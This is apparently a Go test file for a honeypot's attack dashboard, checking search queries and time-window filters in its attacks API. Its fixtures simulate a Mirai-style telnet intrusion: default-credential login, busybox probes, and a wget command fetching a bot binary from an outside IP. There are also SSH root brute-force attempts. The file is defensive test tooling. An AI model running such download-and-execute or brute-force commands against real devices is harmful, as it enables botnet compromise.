package main

import (
	"encoding/json"
	"net/http/httptest"
	"strconv"
	"testing"
	"time"
)

// Jeder Wert der Feldstatistik trägt einen Suchbegriff, der genau die Angriffe mit diesem Wert trifft.
func TestOverviewQueriesMatch(t *testing.T) {
	mirai := attackOf(sessEv(loginEv("telnet", "admin", "admin", map[string]any{"success": true}), "o1"),
		sessEv(svcCmd("telnet", "/bin/busybox HISILICON"), "o1"), sessEv(svcCmd("telnet", `echo -e "\x47\x41\x59\x46\x47\x54"`), "o1"),
		sessEv(svcCmd("telnet", "wget http://198.51.100.20/x86_64 -O q"), "o1"))
	mirai.Country, mirai.ASN = "DE", 64500
	brute := attackOf(loginEv("ssh", "root", "123456", nil), loginEv("ssh", "root", "admin", nil))
	brute.Country, brute.ASN = "NL", 64501
	o := newOverview(0, 1)
	for _, a := range []*Attack{mirai, brute} {
		o.addFields(a)
	}
	o.finish()
	if len(o.Fields) < 6 {
		t.Fatalf("Felder: %+v", o.Fields)
	}
	for _, f := range o.Fields {
		for _, v := range f.Top {
			terms := parseQuery(v.Query)
			got := 0
			for _, a := range []*Attack{mirai, brute} {
				if a.matchQuery(terms) {
					got++
				}
			}
			if got != v.N {
				t.Errorf("%s %q: Suchbegriff %q trifft %d statt %d", f.Key, v.Value, v.Query, got, v.N)
			}
		}
	}
}

// /api/attacks?overview=1: Verlauf ohne Stufen- und Zeitfilter, Trichter ohne Stufenfilter,
// Zeitfenster from/to grenzt die Liste ein.
func TestAttacksOverviewAndTimeWindow(t *testing.T) {
	h := testHive(t)
	w, wait := testWriter(t, h.st)
	now := time.Now()
	old := now.Add(-5 * time.Hour)
	for _, e := range []*Event{
		evAt(old, "connect", "telnet", "203.0.113.40", 23, nil),
		evAt(now.Add(-10*time.Minute), "login", "ssh", "203.0.113.41", 22, map[string]any{"success": false}),
		evAt(now.Add(-9*time.Minute), "connect", "redis", "203.0.113.42", 6379, nil),
	} {
		w.Submit(e)
	}
	wait()
	get := func(q string) (r struct {
		Attacks  []*Attack
		Matched  int
		Overview *attackOverview
	}) {
		rec := httptest.NewRecorder()
		h.attacks(rec, httptest.NewRequest("GET", "/api/attacks?range=24h&overview=1&"+q, nil))
		json.Unmarshal(rec.Body.Bytes(), &r)
		return
	}
	all := get("")
	if all.Matched != 3 || all.Overview == nil || len(all.Overview.Hist) != overviewBuckets || all.Overview.Stufen[0] != 2 || all.Overview.Stufen[1] != 1 {
		t.Fatalf("%+v %+v", all.Matched, all.Overview)
	}
	from := now.Add(-time.Hour).UnixMilli()
	win := get("from=" + strconv.FormatInt(from, 10) + "&stufe=0")
	if win.Matched != 1 || win.Attacks[0].IP != "203.0.113.42" {
		t.Errorf("Zeitfenster: %d %+v", win.Matched, win.Attacks)
	}
	hist := 0
	for _, b := range win.Overview.Hist {
		for _, n := range b {
			hist += n
		}
	}
	if hist != 3 || win.Overview.Stufen[1] != 1 {
		t.Errorf("Verlauf %d, Stufen %v", hist, win.Overview.Stufen)
	}
}
